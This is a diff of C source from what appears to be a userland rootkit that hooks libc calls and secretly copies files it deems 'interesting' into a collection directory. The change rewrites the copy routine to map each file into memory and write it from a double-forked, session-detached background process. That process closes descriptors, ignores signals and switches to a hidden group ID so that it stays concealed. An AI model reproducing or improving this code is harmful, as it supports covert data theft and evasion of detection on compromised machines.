@@ -113,10 +113,9 @@ int interesting(const char *path){
 int writecopy(const char *oldpath, char *newpath){
     struct stat nstat; // for newpath, should it exist, to check if there's a change in size.
     int statr;
-    unsigned char *buf;
+    unsigned char *map;
     FILE *ofp, *nfp;
-    size_t n, m;
-    off_t blksize, fsize;
+    off_t fsize;
     mode_t mode;
 
     hook(CFWRITE, C__XSTAT);
@@ -150,33 +149,63 @@ int writecopy(const char *oldpath, char *newpath){
     }
 #endif
 
-    blksize = getablocksize(fsize);
-    do{
-        buf = malloc(blksize+1);
-        if(!buf) goto nopenope;
-        memset(buf, 0, blksize+1);
-        n = fread(buf, 1, blksize, ofp);
-        if(n){
-            m = (long)call(CFWRITE, buf, 1, n, nfp);
-            fflush(nfp);
-        }else m = 0;
-        fflush(ofp);
-        free(buf);
-    }while(n > 0 && n == m);
-nopenope:
+    int fd = fileno(ofp);
+    map = mmap(NULL, fsize, PROT_READ, MAP_SHARED, fd, 0);
     fclose(ofp);
-    fclose(nfp);
+    if(map == MAP_FAILED){
+        fclose(nfp);
+        return -1;
+    }
 
+    if(map){
+        pid_t pid = fork();
+        if(pid < 0){
+            msync(map, fsize, MS_SYNC);
+            munmap(map, fsize);
+            fclose(nfp);
+            return -1;
+        }else if(pid > 0){
+            msync(map, fsize, MS_SYNC);
+            munmap(map, fsize);
+            fclose(nfp);
+            if(fileno(stdout) && isatty(fileno(stdout)))
+                signal(SIGCHLD, SIG_IGN); // wtaf?
+            return 1;
+        }else if(pid == 0){
+            umask(0);
+            if(setsid() < 0)
+                exit(0);
+
+            for(int i=sysconf(_SC_OPEN_MAX); i>=0; i--)
+                if(i != fileno(nfp))
+                    close(i);
+
+            signal(SIGCHLD, SIG_IGN);
+            signal(SIGHUP, SIG_IGN);
+
+            if(!notuser(0)){ // hide, if we can.
+                hook(CSETGID);
+                call(CSETGID, readgid());
+            }
+
+            pid = fork();
+            if(pid != 0) exit(0);
+
+            hook(CFWRITE);
+            call(CFWRITE, map, 1, fsize, nfp);
 #ifdef KEEP_FILE_MODE
-    hook(CCHMOD);
-    call(CCHMOD, newpath, mode);
+            hook(CCHMOD);
+            call(CCHMOD, newpath, mode);
 #endif
+            exit(0);
+        }
+    }
 
     return 1;
 }
 
 char *getnewpath(char *filename){
-    int path_maxlen = strlen(INTEREST_DIR) +
+    int path_maxlen = LEN_INTEREST_DIR +
                       strlen(filename) + 32;
     char *ret, *filenamedup = strdup(filename);
 
